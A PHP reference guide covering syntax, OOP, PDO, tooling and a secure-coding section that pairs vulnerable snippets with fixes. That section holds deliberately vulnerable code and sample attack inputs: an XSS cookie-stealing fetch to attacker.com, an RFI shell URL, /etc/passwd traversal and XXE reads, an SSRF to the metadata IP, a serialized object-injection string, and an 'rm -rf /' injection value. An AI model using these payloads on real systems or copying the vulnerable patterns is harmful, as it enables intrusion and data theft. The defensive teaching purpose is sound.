---
seoTitle: PHP Programming Reference – Modern Web Development and Security Guide
description: "Comprehensive PHP reference covering syntax, OOP, database design (PDO), Composer, Laravel, and critical cybersecurity vulnerabilities with modern secure coding mitigations."
keywords: "php, php programming, security, sql injection, xss, type juggling, laravel, symfony, composer, pdo, lfi, rfi, object injection"
displayTitle: PHP
---

- # History & Intro
	- **How**:
		- Created by **Rasmus Lerdorf** in 1994, originally written as a set of Common Gateway Interface (CGI) binaries in C.
		- Originally named **Personal Home Page Tools (PHP Tools)**, later rebranded as **PHP: Hypertext Preprocessor** (a recursive acronym).
		- Evolved through major engine milestones: PHP 3 (rewritten by Zeev Suraski and Andi Gutmans, creating the Zend Engine core), PHP 5 (bringing complete object-oriented models), PHP 7 (massive speed optimizations and scalar types), and PHP 8 (introducing JIT compilation, attributes, and union types).
	-
	- **Who**:
		- Created by **Rasmus Lerdorf**.
		- Maintained by the **PHP Development Team** and the global open-source community, supported by the **PHP Foundation** (founded in 2021).
	-
	- **Why**:
		- Built to simplify server-side web development. Prior to PHP, programmers had to write complex C/C++ CGI programs or Perl scripts to handle dynamic page generation.
		- Emphasizes low barrier to entry, speed, flexibility, and extensive built-in database drivers.
-
- # Introduction
	- ## Core Pillars
	  collapsed:: true
		- **Server-Side Execution** — Code is executed on the server, producing standard HTML, CSS, and JS sent back to the browser.
		- **Dynamic Typing** — Variable types are determined dynamically at runtime, though modern PHP (7+) supports strict scalar types.
		- **Extensive Database Integration** — Native support for MySQL, PostgreSQL, SQLite, Oracle, and MSSQL.
		- **Request-Response Execution Model** — Shared-nothing architecture. PHP is initialized, handles a request, releases all resources, and terminates.
	-
	- ## Advantages
	  collapsed:: true
		- **Massive Ecosystem** — Powers over 75% of the web (mostly via WordPress, Drupal, Magento, Laravel, Symfony).
		- **Ease of Deployment** — Runs seamlessly across standard Apache, Nginx, or IIS servers using PHP-FPM or Apache modules.
		- **Excellent Frameworks** — Laravel and Symfony provide modern MVC structures, dependency injection, and secure defaults.
		- **Speed (Modern PHP)** — PHP 7.x/8.x performance is competitive with Node.js and Python due to Zend Engine optimizations and JIT compilers.
	-
	- ## Disadvantages
	  collapsed:: true
		- **Legacy Baggage** — Inconsistent naming conventions in the standard library (e.g., `strpos` vs `str_replace`, varying parameter orders).
		- **Mutable Defaults** — Historically configured with unsafe defaults (like `register_globals` or loose type comparisons), though modern setups are strict.
		- **Synchronous Execution Model** — Lacks native built-in asynchronous runtimes, requiring libraries like Swoole or ReactPHP for async event loops.
		- **Steep Security Responsibility** — A low entry barrier can lead to poorly written code containing severe vulnerabilities if security concepts are overlooked.
-
- # Basics & Control Flow
  collapsed:: true
	- ## Syntax & Entry Point
		- PHP code blocks are enclosed in standard tags: `<?php ... ?>`.
		- ```php
		  <?php
		  // Hello World
		  echo "Hello, World!"; 
		  
		  // The closing tag can be omitted in pure PHP files to prevent accidental whitespace output.
		  ```
		- **`echo`** vs **`print`**: `echo` has no return value and accepts multiple parameters; `print` returns `1` and can be used in expressions.
	-
	- ## Variables & Scalar Types
		- All variables begin with a dollar sign `$` and must start with a letter or underscore.
		- ```php
		  $string = "Bro";           // String
		  $int = 42;                 // Integer
		  $float = 3.14;             // Float
		  $bool = true;              // Boolean
		  $null = null;              // Null
		  
		  // String Interpolation
		  echo "Hello {$string}!";   // Outputs: Hello Bro!
		  echo "Your cost is \$10";  // Escape characters with backslash
		  ```
	-
	- ## Control Flow Expressions
		- ```php
		  // if-elseif-else structure
		  $age = 15;
		  if ($age >= 18) {
		      echo "Adult";
		  } elseif ($age >= 13) {
		      echo "Teenager";
		  } else {
		      echo "Child";
		  }
		  
		  // Ternary Operator
		  $status = ($age >= 18) ? "Adult" : "Minor";
		  
		  // Null Coalescing Operator (PHP 7+)
		  $username = $_GET['user'] ?? 'anonymous';
		  
		  // Match expression (PHP 8+): Strict type check, returns value
		  $code = 200;
		  $message = match ($code) {
		      200, 201 => 'Success',
		      400 => 'Bad Request',
		      default => 'Unknown Error',
		  };
		  ```
	-
	- ## Loops
		- ```php
		  // For loop
		  for ($i = 0; $i < 5; $i++) {
		      echo $i;
		  }
		  
		  // While loop
		  $count = 0;
		  while ($count < 3) {
		      echo $count++;
		  }
		  
		  // Do-While
		  $x = 10;
		  do {
		      echo $x++;
		  } while ($x < 12);
		  
		  // Foreach (Iterating over array values)
		  $fruits = ["Apple", "Banana", "Cherry"];
		  foreach ($fruits as $fruit) {
		      echo $fruit;
		  }
		  
		  // Foreach (Iterating over keys and values)
		  $prices = ["Apple" => 1.5, "Banana" => 0.8];
		  foreach ($prices as $key => $val) {
		      echo "{$key}: {$val}";
		  }
		  ```
	-
	- ## Arrays: Three Flavors
		- In PHP, all arrays are internally ordered maps.
		- ```php
		  // 1. Indexed Array
		  $list = ["Apple", "Orange", "Coconut"];
		  $list[] = "Pineapple"; // Push to end
		  array_pop($list);      // Remove last element
		  
		  // 2. Associative Array (Key-value map)
		  $capitals = [
		      "USA" => "Washington DC",
		      "INDIA" => "New Delhi"
		  ];
		  $capitals["JAPAN"] = "Tokyo"; // Add key
		  
		  // 3. Multidimensional Array
		  $matrix = [
		      [1, 2, 3],
		      [4, 5, 6]
		  ];
		  ```
-
- # Intermediate PHP
  collapsed:: true
	- ## References Variables & Memory Behavior
		- PHP uses a **Copy-on-Write (CoW)** memory mechanism. Two variables point to the same memory segment until one of them is modified. References (`&`) bypass this, linking two variables directly.
		- ```php
		  $a = 10;
		  $b = &$a; // $b is a reference to $a
		  $b = 20;
		  echo $a; // Outputs 20
		  
		  // Unsetting a reference only breaks the link, it doesn't destroy the value
		  unset($b);
		  echo $a; // Outputs 20
		  ```
	-
	- ## Generators (yield)
		- Generators allow you to write code that uses `foreach` to iterate over a set of data without needing to build an array in memory, saving massive overhead on large datasets.
		- ```php
		  function getRangeGenerator(int $start, int $end) {
		      for ($i = $start; $i <= $end; $i++) {
		          yield $i; // execution suspends here and returns value
		      }
		  }
		  
		  foreach (getRangeGenerator(1, 1000000) as $num) {
		      // Uses minimal memory (KB scale) compared to generating a 1M element array (MB scale)
		  }
		  ```
	-
	- ## Constants & Magic Constants
		- ```php
		  // Define at runtime
		  define("TAX_RATE", 0.18);
		  
		  // Define at compile-time (inside classes allowed)
		  const MAX_LIMIT = 5000;
		  
		  // Magic Constants
		  echo __LINE__;      // Current line number
		  echo __FILE__;      // Full path and filename of the file
		  echo __DIR__;       // Directory of the file
		  echo __FUNCTION__;  // Function name
		  echo __CLASS__;     // Class name (including namespace)
		  echo __METHOD__;    // Class method name
		  echo __NAMESPACE__; // Name of the current namespace
		  ```
	-
	- ## Array Helper Functions Catalog
		- ```php
		  $numbers = [1, 2, 3, 4, 5];
		  
		  // array_map: Apply callback to elements
		  $squares = array_map(fn($x) => $x * $x, $numbers); // [1, 4, 9, 16, 25]
		  
		  // array_filter: Keep elements passing truth test
		  $evens = array_filter($numbers, fn($x) => $x % 2 === 0); // [2, 4]
		  
		  // array_reduce: Reduce array to a single value
		  $sum = array_reduce($numbers, fn($carry, $x) => $carry + $x, 0); // 15
		  
		  // checks
		  in_array(3, $numbers, true); // true (strict check)
		  array_key_exists('USA', $capitals); // check key exists
		  ```
	-
	- ## Superglobals Complete Breakdown
		- Special built-in arrays accessible in all scopes.
		- **`$GLOBALS`** — Contains references to all variables globally defined.
		- **`$_SERVER`** — Headers, paths, script locations.
		- **`$_GET`** — Variables passed to the script via URL parameters.
		- **`$_POST`** — Variables passed to the script via HTTP POST body.
		- **`$_FILES`** — Items uploaded via HTTP POST multipart form.
		- **`$_COOKIE`** — Cookies passed via HTTP headers.
		- **`$_SESSION`** — Active session variables.
		- **`$_ENV`** — Environment variables.
-
- # Object-Oriented PHP
  collapsed:: true
	- ## Classes & Constructor Property Promotion (PHP 8)
		- ```php
		  namespace App\Services;
		  
		  class User {
		      // Constructor property promotion (declares and initializes properties directly)
		      public function __construct(
		          private int $id,
		          protected string $username,
		          public string $email
		      ) {}
		      
		      public function getUsername(): string {
		          return $this->username;
		      }
		  }
		  
		  $user = new User(1, "Bro", "bro@test.com");
		  ```
	-
	- ## Inheritance & Visibility Modifiers
		- Classes and methods can be overridden unless marked with `final`.
		- ```php
		  class Account {
		      protected float $balance = 0.0;
		      
		      public function deposit(float $amount): void {
		          $this->balance += $amount;
		      }
		  }
		  
		  class PremiumAccount extends Account {
		      private float $bonusRate = 0.05;
		      
		      // Override method
		      public function deposit(float $amount): void {
		          $bonus = $amount * $this->bonusRate;
		          $this->balance += ($amount + $bonus);
		      }
		  }
		  ```
	-
	- ## Interfaces & Traits
		- Interfaces define contracts. Traits are mechanisms for code reuse, facilitating horizontal composition of methods.
		- ```php
		  interface Loggable {
		      public function log(string $msg): void;
		  }
		  
		  trait Cryptography {
		      public function hashString(string $data): string {
		          return password_hash($data, PASSWORD_BCRYPT);
		      }
		  }
		  
		  class SecureLogger implements Loggable {
		      use Cryptography; // Import trait methods
		      
		      public function log(string $msg): void {
		          $hashed = $this->hashString($msg);
		          // write to log
		      }
		  }
		  ```
	-
	- ## Magic Methods Catalog (All 17 Methods)
		- Magic methods are special methods that override PHP's default actions when certain operations are performed on an object.
		- ```php
		  class MagicShow {
		      private array $data = [];
		  
		      public function __construct() {} // 1. Instantiate
		      public function __destruct() {}  // 2. Destructor
		  
		      // 3. Called when writing data to inaccessible properties
		      public function __set(string $name, $value): void {
		          $this->data[$name] = $value;
		      }
		  
		      // 4. Called when reading data from inaccessible properties
		      public function __get(string $name) {
		          return $this->data[$name] ?? null;
		      }
		  
		      // 5. Triggered by calling isset() or empty() on inaccessible properties
		      public function __isset(string $name): bool {
		          return isset($this->data[$name]);
		      }
		  
		      // 6. Triggered by using unset() on inaccessible properties
		      public function __unset(string $name): void {
		          unset($this->data[$name]);
		      }
		  
		      // 7. Triggered when invoking an inaccessible method in object context
		      public function __call(string $name, array $arguments) {
		          return "Called method $name with: " . implode(', ', $arguments);
		      }
		  
		      // 8. Triggered when invoking an inaccessible method in static context
		      public static function __callStatic(string $name, array $arguments) {
		          return "Static called $name";
		      }
		  
		      // 9. Invoked when serialize() is run on an object (returns keys to serialize)
		      public function __sleep(): array {
		          return ['data'];
		      }
		  
		      // 10. Invoked when unserialize() is run on an object to restore state
		      public function __wakeup(): void {
		          // Re-establish DB connections, etc.
		      }
		  
		      // 11. Custom serialisation (since PHP 7.4)
		      public function __serialize(): array {
		          return $this->data;
		      }
		  
		      // 12. Custom deserialisation (since PHP 7.4)
		      public function __unserialize(array $data): void {
		          $this->data = $data;
		      }
		  
		      // 13. Invoked when object is converted to string (e.g. echo $obj)
		      public function __toString(): string {
		          return "MagicShow Instance Data count: " . count($this->data);
		      }
		  
		      // 14. Triggered when an object is called as a function (e.g. $obj(args))
		      public function __invoke(...$args) {
		          return "Invoked as function with args!";
		      }
		  
		      // 15. Triggered by var_export()
		      public static function __set_state(array $properties) {
		          $obj = new MagicShow();
		          $obj->data = $properties['data'] ?? [];
		          return $obj;
		      }
		  
		      // 16. Invoked when cloning objects (deep copies)
		      public function __clone() {
		          // deep clone objects inside
		      }
		  
		      // 17. Triggered by var_dump() to retrieve properties to show
		      public function __debugInfo(): array {
		          return ['safedata' => $this->data];
		      }
		  }
		  ```
	-
	- ## Reflection API & Constructor Dependency Injection Container
		- Reflection inspects classes, methods, and types. Here is a functional, dynamic dependency injection (DI) container:
		- ```php
		  class Container {
		      private array $instances = [];
		  
		      public function get(string $class) {
		          if (isset($this->instances[$class])) {
		              return $this->instances[$class];
		          }
		  
		          $reflector = new \ReflectionClass($class);
		          
		          if (!$reflector->isInstantiable()) {
		              throw new \Exception("Class {$class} is not instantiable.");
		          }
		  
		          $constructor = $reflector->getConstructor();
		          if (null === $constructor) {
		              return new $class(); // No dependency constructor
		          }
		  
		          $parameters = $constructor->getParameters();
		          $dependencies = [];
		  
		          foreach ($parameters as $parameter) {
		              $type = $parameter->getType();
		              if (!$type || $type->isBuiltin()) {
		                  throw new \Exception("Cannot resolve parameter {$parameter->getName()}");
		              }
		              // Recursively instantiate dependency
		              $dependencies[] = $this->get($type->getName());
		          }
		  
		          $instance = $reflector->newInstanceArgs($dependencies);
		          $this->instances[$class] = $instance;
		          return $instance;
		      }
		  }
		  ```
-
- # SPL (Standard PHP Library)
  collapsed:: true
	- ## SPL Data Structures
		- SPL provides optimized objects for standard datastructures, bypassing slow array semantics.
		- ```php
		  // SplFixedArray: Memory-efficient contiguous structure
		  $array = new \SplFixedArray(100);
		  $array[0] = "Item"; // Faster and consumes ~30% less memory than native array
		  
		  // SplStack: LIFO Stack
		  $stack = new \SplStack();
		  $stack->push("A");
		  $stack->push("B");
		  echo $stack->pop(); // B
		  
		  // SplQueue: FIFO Queue
		  $queue = new \SplQueue();
		  $queue->enqueue("First");
		  $queue->enqueue("Second");
		  echo $queue->dequeue(); // First
		  ```
	-
	- ## SPL Iterators
		- ```php
		  // RecursiveDirectoryIterator: Scan nested directories quickly
		  $dirIterator = new \RecursiveDirectoryIterator(__DIR__);
		  $iterator = new \RecursiveIteratorIterator($dirIterator);
		  
		  foreach ($iterator as $file) {
		      if ($file->isFile() && $file->getExtension() === 'php') {
		          echo $file->getPathname() . "\n";
		      }
		  }
		  ```
-
- # Database Interoperability
  collapsed:: true
	- ## Vulnerable Legacy MySQLi (Avoid)
		- Raw interpolation in queries allows SQL injection.
		- ```php
		  // DANGEROUS: DO NOT DO THIS
		  $id = $_GET['id'];
		  $query = "SELECT * FROM users WHERE id = " . $id; 
		  $result = $mysqli->query($query);
		  ```
	-
	- ## Secure PHP Data Objects (PDO) Prepared Statements
		- PDO is the industry standard for database access. It separates query structure from input parameters.
		- ```php
		  try {
		      $pdo = new PDO("mysql:host=localhost;dbname=testdb;charset=utf8mb4", "dbuser", "password", [
		          PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
		          PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
		          PDO::ATTR_EMULATE_PREPARES => false, // Use true prepared statements
		      ]);
		      
		      // Named parameters query
		      $stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email AND status = :status");
		      $stmt->execute([
		          'email' => $_POST['email'],
		          'status' => 'active'
		      ]);
		      
		      $users = $stmt->fetchAll();
		      foreach ($users as $user) {
		          echo $user['username'];
		      }
		  } catch (PDOException $e) {
		      error_log("Database Error: " . $e->getMessage());
		      echo "An error occurred processing your request.";
		  }
		  ```
-
- # Cybersecurity Deep-Dive
  collapsed:: true
	- ## Type Juggling Vulnerabilities
		- > [!WARNING] Loose Comparisons
		  > PHP has a loose typing model. When checking variables with `==`, it coerces types, which can lead to severe security failures (e.g. string matching to `0` or `true`).
		- ```php
		  // Vulnerable comparison code
		  $hash = "0e132456789"; // String starting with '0e' represents scientific notation float 0
		  $user_input = "0e998877665";
		  if ($hash == $user_input) {
		      // TRUE! Both are coerced to float (0 * 10^x = 0).
		      // This is a Magic Hash vulnerability bypass.
		  }
		  
		  // Secure Fix
		  // Always use strict equality (===) to compare values and types,
		  // and declare strict types at the top of the file:
		  declare(strict_types=1);
		  
		  if ($hash === $user_input) { // False (values are checked strictly by type)
		  }
		  ```
	-
	- ## SQL Injection (SQLi)
		- > [!CAUTION] Dynamic SQL Query Construction
		  > Concatenating unsanitized inputs into SQL statements allows attackers to control logic paths (e.g. `' OR '1'='1`).
		- **Vulnerable Code**:
		  ```php
		  $user = $_POST['username'];
		  $pass = $_POST['password'];
		  $sql = "SELECT * FROM admins WHERE username = '$user' AND password = '$pass'";
		  // If user enters: admin' -- 
		  // The query becomes: SELECT * FROM admins WHERE username = 'admin' -- ...
		  // Bypasses password check entirely.
		  ```
		- **Secure Mitigation**:
		  Always use prepared statements. Parameter parameters are sent separately to the DBMS, preventing payload code execution.
		  ```php
		  $stmt = $pdo->prepare("SELECT * FROM admins WHERE username = ? AND password = ?");
		  $stmt->execute([$user, $pass]);
		  $admin = $stmt->fetch();
		  ```
	-
	- ## Cross-Site Scripting (XSS)
		- > [!CAUTION] Unescaped HTML/JS Output
		  > Displaying input variables directly inside html responses allows attackers to execute malicious Javascript payloads (like cookie stealing) in users' browsers.
		- **Vulnerable Code**:
		  ```php
		  // If parameter is: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
		  echo "Welcome, " . $_GET['name']; 
		  ```
		- **Secure Mitigation**:
		  Escape output encoding using `htmlspecialchars()` with `ENT_QUOTES` and specify UTF-8.
		  ```php
		  $safe_name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
		  echo "Welcome, " . $safe_name;
		  ```
	-
	- ## Cross-Site Request Forgery (CSRF)
		- > [!WARNING] Unvalidated State-Changing Actions
		  > Attackers can force legitimate users to execute unintended operations (like changing passwords) on web applications where they are currently authenticated.
		- **Secure Mitigation**:
		  Generate cryptographically secure tokens linked to user sessions. Validate the token on post actions.
		  ```php
		  // Token generation
		  if (empty($_SESSION['csrf_token'])) {
		      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
		  }
		  
		  // In HTML Form
		  // <input type="hidden" name="token" value="<?php echo $_SESSION['csrf_token']; ?>">
		  
		  // Validation on POST
		  if (!hash_equals($_SESSION['csrf_token'], $_POST['token'] ?? '')) {
		      die("CSRF Token validation failed.");
		  }
		  ```
	-
	- ## Local & Remote File Inclusion (LFI/RFI)
		- > [!CAUTION] Dynamic File Inclusion
		  > Passing inputs directly to `include`, `require`, or file manipulation functions allows attackers to read internal server resources (e.g. `/etc/passwd`) or execute arbitrary remote shell scripts.
		- **Vulnerable Code**:
		  ```php
		  // If page parameter is: ../../../../etc/passwd
		  // If page parameter is: http://attacker.com/shell.txt
		  include($_GET['page'] . ".php");
		  ```
		- **Secure Mitigation**:
		  1. Disable remote file imports by setting `allow_url_include = Off` in `php.ini`.
		  2. Use a whitelist array for valid pages, or extract the base name only.
		  ```php
		  $allowed_pages = ['home', 'about', 'contact'];
		  $page = $_GET['page'] ?? 'home';
		  
		  if (!in_array($page, $allowed_pages, true)) {
		      die("Access Denied");
		  }
		  include("pages/" . $page . ".php");
		  ```
	-
	- ## Unsafe Object Deserialization (PHP Object Injection)
		- > [!CAUTION] Deserializing Untrusted Strings
		  > Using `unserialize()` on user-controlled inputs allows attackers to manipulate object properties and invoke magic functions (like `__destruct`, `__wakeup`, or `__toString`), triggering Remote Code Execution (RCE).
		- **Vulnerable Code**:
		  ```php
		  class FileCleaner {
		      public $file_path;
		      public function __destruct() {
		          unlink($this->file_path); // Arbitrary file deletion
		      }
		  }
		  
		  // If cookies/input contains serialized payload: O:11:"FileCleaner":1:{s:9:"file_path";s:11:"index.php";}
		  $user_data = unserialize($_COOKIE['data']); 
		  ```
		- **Secure Mitigation**:
		  Never pass untrusted user data to `unserialize()`. Instead, serialize using standard data formats like `json_encode()` and `json_decode()`.
		  ```php
		  $data = json_decode($_COOKIE['data'], true); // Safe associative array parsing
		  ```
	-
	- ## XML External Entity (XXE) Injection
		- > [!CAUTION] Unsafe XML Entity Processing
		  > If the XML parser is configured to parse external entities, a user-controlled XML input can force the server to read arbitrary internal files, open socket connections, or execute internal requests.
		- **Vulnerable Code**:
		  ```php
		  // Attack XML Payload containing System identifier:
		  // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
		  // <result>&xxe;</result>
		  $xml_data = $_POST['xml'];
		  $xml_element = simplexml_load_string($xml_data); // Default parses external entities in legacy PHP engines
		  ```
		- **Secure Mitigation**:
		  Explicitly disable entity loader execution before parsing XML inputs (note: in modern PHP 8.0, XML external entity loading is disabled by default).
		  ```php
		  libxml_use_internal_errors(true);
		  // Disable external entity parsing
		  libxml_disable_entity_loader(true); 
		  $xml_element = simplexml_load_string($xml_data);
		  ```
	-
	- ## Server-Side Request Forgery (SSRF)
		- > [!CAUTION] Processing Arbitrary User URLs
		  > Accepting user-submitted URLs and sending server-side requests (via cURL or `file_get_contents`) allows attackers to scan internal infrastructure, retrieve metadata (e.g. AWS credentials from 169.254.169.254), or access internal APIs.
		- **Vulnerable Code**:
		  ```php
		  $target_url = $_POST['url'];
		  // Attacker inputs: http://169.254.169.254/latest/meta-data/
		  $response = file_get_contents($target_url);
		  ```
		- **Secure Mitigation**:
		  1. Check input URLs against a strict whitelist domain list.
		  2. Ensure parsed IPs do not map to private, loopback, or link-local network segments.
		  ```php
		  $url = $_POST['url'];
		  $host = parse_url($url, PHP_URL_HOST);
		  $ip = gethostbyname($host);
		  
		  // Validate IP is not private (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16)
		  $ip_long = ip2long($ip);
		  if ($ip_long === false || 
		      filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
		      die("Invalid target URL");
		  }
		  $ch = curl_init($url);
		  curl_exec($ch);
		  ```
	-
	- ## Insecure File Uploads (RCE)
		- > [!CAUTION] Uploading Executable Scripts
		  > Allowing users to upload files directly into directories accessible by the web server can result in attackers uploading malicious `.php` scripts and invoking them to gain full shell access.
		- **Vulnerable Code**:
		  ```php
		  $target_dir = "uploads/";
		  $target_file = $target_dir . basename($_FILES["file"]["name"]);
		  move_uploaded_file($_FILES["file"]["tmp_name"], $target_file); // Allows .php files!
		  ```
		- **Secure Mitigation**:
		  1. Whitelist extensions.
		  2. Check MIME types using PHP `finfo` (not the header name!).
		  3. Rename files using UUIDs/hashes to prevent execution pathways.
		  4. Store files outside the web document root, or write `.htaccess`/web configs disabling execution in the uploads directory.
		  ```php
		  $finfo = new finfo(FILEINFO_MIME_TYPE);
		  $mime = $finfo->file($_FILES['file']['tmp_name']);
		  
		  $allowed_mimes = ['image/jpeg', 'image/png', 'application/pdf'];
		  $extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
		  $allowed_extensions = ['jpg', 'jpeg', 'png', 'pdf'];
		  
		  if (!in_array($mime, $allowed_mimes, true) || !in_array(strtolower($extension), $allowed_extensions, true)) {
		      die("Invalid file type.");
		  }
		  
		  // Rename file to safe UUID/hash
		  $safe_name = bin2hex(random_bytes(16)) . '.' . $extension;
		  move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/secure_uploads/' . $safe_name);
		  ```
	-
	- ## Command Execution Sanitization
		- > [!CAUTION] Shell Character Injection
		  > Interpolating user values into execution strings (via `shell_exec`, `exec`) can lead to arbitrary shell command execution.
		- **Secure Mitigation**:
		  Use **`escapeshellarg()`** to escape values passing to commands. Never use `escapeshellcmd()` on parameters, as it only escapes overall command delimiters, still allowing argument injections.
		  ```php
		  $user_input = $_POST['ip']; // e.g. "127.0.0.1; rm -rf /"
		  
		  // escapeshellarg wraps parameter in quotes and escapes internal single quotes
		  $safe_arg = escapeshellarg($user_input);
		  $output = shell_exec("ping -c 3 " . $safe_arg);
		  ```
	-
	- ## Session and Cookie Security
		- Avoid session hijacking and fixation. Secure session creation configurations.
		- ```php
		  // Set secure cookie options before starting session
		  session_start([
		      'cookie_lifetime' => 0,
		      'cookie_path' => '/',
		      'cookie_secure' => true,     // Only transmit via HTTPS
		      'cookie_httponly' => true,   // Block Javascript access (Mitigates XSS cookie theft)
		      'cookie_samesite' => 'Strict', // Prevent cross-site request cookie inclusion
		      'use_strict_mode' => true    // Stop session fixation attacks
		  ]);
		  
		  // Regenerate session IDs on privileges changes (e.g. login)
		  session_regenerate_id(true);
		  ```
-
- # Engine, Compiler & Server Runtime
  collapsed:: true
	- ## OPcache Internals
		- PHP is an interpreted language. By default, every request requires compiling the script file into execution bytecode (opcodes) and executing it.
		- **OPcache** intercepts this workflow. It parses and compiles code once, caching compiled opcodes in shared memory (SHM). Subsequent requests fetch compiled opcodes directly, bypassing syntax checking and compiler overhead.
	-
	- ## PHP 8 JIT (Just-In-Time) Compiler
		- Introduced in PHP 8.0, JIT sits outside the standard VM interpreter. It inspects and compiles frequently executed opcode sections (hot zones) directly into native x86/ARM machine assembly, completely bypassing VM interpretation loops. JIT provides massive CPU boosts for calculations, mathematical algorithms, and non-I/O bound workloads.
	-
	- ## Important php.ini Configurations (Production Checklist)
		- ```ini
		  ; Disable error display to users (avoids path disclosure)
		  display_errors = Off
		  log_errors = On
		  error_log = /var/log/php_errors.log
		  
		  ; Restrict file system access to specific directory mappings
		  open_basedir = "/var/www/html/:/tmp/"
		  
		  ; Hide PHP version headers in HTTP responses
		  expose_php = Off
		  
		  ; Memory and executions limits
		  memory_limit = 256M
		  max_execution_time = 30
		  upload_max_filesize = 10M
		  post_max_size = 10M
		  ```
-
- # Ecosystem & Tooling
  collapsed:: true
	- ## Composer (Dependency Manager)
		- `composer.json` declares requirements:
		- ```json
		  {
		      "name": "app/core",
		      "require": {
		          "php": "^8.1",
		          "vlucas/phpdotenv": "^5.5",
		          "monolog/monolog": "^3.2"
		      },
		      "autoload": {
		          "psr-4": {
		              "App\\": "src/"
		          }
		      }
		  }
		  ```
		- ```bash
		  composer install          # Install dependencies from composer.lock
		  composer require <pkg>    # Install and add package to composer.json
		  composer dump-autoload    # Rebuild autoload structures (optimized mapping)
		  ```
	-
	- ## Quality & Validation Tools
		- **PHPUnit** — The standard unit testing framework.
		- **PHPStan / Psalm** — Static analysis engines checking type compliance, dead code pathways, and security alerts.
		- **Xdebug** — Debugger extension mapping call stacks, variable states, and profiling execution memory.
-
- # Comparison: PHP vs C++
  collapsed:: true
	- ## Direct Comparison Table
		- ```
		  Feature                  PHP                                     C++
		  Execution Model          Request-Response, Shared-Nothing         Compiled binary, continuous execution
		  Memory Management        Reference Counting GC (automatic)       Manual RAII / Smart Pointers / Raw delete
		  Type System              Dynamic / Scalar Type Hints (Gradual)   Strict, static compile-time typing
		  Primary Use Case         Web Backends, API services, SaaS        Game engines, OS kernels, high-performance systems
		  Undefined Behavior       Rare (runtime errors, type coercion)    Extremely common (out-of-bounds, pointer math)
		  Dependency Management    Composer (Standardized repository)      Decentralized (Conan, Vcpkg, CMake subprojects)
		  Compilation              Opcode caching (Opcache), JIT           AOT (Ahead of Time) compilation to machine code
		  Object Model             Single inheritance + Interfaces + Traits Multiple inheritance + Virtual inheritance
		  ```
-
- # Libs & Framework
	- ## Core Web Frameworks:
		- [[Laravel]] - A modern web framework with active components: Eloquent ORM, Blade templating, routing, and database queues.
		- [[Symfony]] - Robust enterprise structure. Its independent components form the foundation of Drupal, Magento, and Laravel.
		- [[Lumen]] - Laravel-based micro-framework optimized for lightweight REST APIs.
		- [[Slim]] - Minimalist PHP micro-framework featuring basic routing, middleware integration, and container injections.
	-
	- ## Database & Utilities:
		- [[Doctrine ORM]] - Advanced object-relational mapper implementing the Data Mapper design pattern instead of Active Record.
		- [[Carbon]] - Essential extension library for `DateTime` adjustments and formatting.
		- [[Guzzle]] - Standard HTTP client handling synchronous and asynchronous request arrays.
		- [[Twig]] - Fast, secure, and isolated modern templating engine.
	-
	- ## Logging & Validation:
		- [[Monolog]] - Logging standard outputting debugs, warnings, and alerts to files, databases, or third-party log indexes.
		- [[PHPStan]] - Advanced static analyzer checking for types, calls, and logical bugs without running code.
		- [[PHPUnit]] - Standard test-driven development (TDD) harness framework.
-
- # More learn
	- Explore the following links for valuable resources, communities, and tools to enhance your skills :-
		- [Official PHP Documentation](https://www.php.net/docs.php)
		- [PHP Security Guide (OWASP)](https://owasp.org/www-project-cheat-sheets/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
		- [Modern PHP Development Best Practices](https://phptherightway.com/)
		- [PHP Roadmap & Standards](https://github.com/thecodeholic/php-developer-roadmap)